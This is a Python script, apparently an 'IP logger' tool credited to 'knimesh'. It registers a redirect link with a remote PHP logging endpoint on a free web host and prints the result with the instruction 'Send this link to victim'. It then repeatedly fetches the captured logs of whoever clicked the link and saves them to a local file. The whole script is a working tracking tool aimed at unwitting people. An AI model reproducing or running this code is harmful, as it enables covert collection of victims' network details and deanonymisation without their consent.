import subprocess
subprocess.run('clear')
print ('\033[1;32;40m')
print ('''<-┌─────────────────────────────┐->
<-│  ▖      ▜▘▛▀▖▌  ▜▘       ▖  │->
<-│▃▀▄▄▖▄▄▖ ▐ ▙▄▘▌  ▐  ▄▄▖▄▄▖▝▚▖│->
<-│ ▀▖      ▐ ▌  ▌  ▐        ▞▘ │->
<-│         ▀▘▘  ▀▀▘▀▘          │->
<-└─────────────────────────────┘->
         author --> knimesh
  _______________________________''')
print ('')
import requests
from urllib.request import Request, urlopen
uname=input('\033[1;31;40m[+] \033[1;32;40mEnter user name :')
link=input('\033[1;31;40m[+] \033[1;32;40mRedirect to : ')
res = requests.post("http://iloveyoutrue.000webhostapp.com/logs/write.php",data={'uname':uname,'link':link})
a =(res.text)
url =('http://iloveyoutrue.000webhostapp.com/logs/')
l=''.join([url,a,'.php'])
print ('\033[1;31;40m')
print ('[-]\033[1;32;40m Send this link to victim: ')
print ('\033[1;31;40m')
print (l)
print ('\033[1;32;40m')
print ("To view Logs Type ' y ' and Enter")
print ('')
rs=''.join([url,a])
while True:
        print ('''\033[1;31;40m[y]\033[1;32;40mRefesh
\033[1;31;40m[e]\033[1;32;40mExit''')
        print ('')
        a=input('\033[1;31;40m>>> ')
        if a=='y':
                s=Request(rs)
                webpage = urlopen(s).read()
                a=webpage.decode("utf-8")
                print ('\033[1;36;40m')
                print (a)
                print ('\033[1;32;40m')
                o=open('logs','w')
                o.write(a)
        elif a=='e':
                break
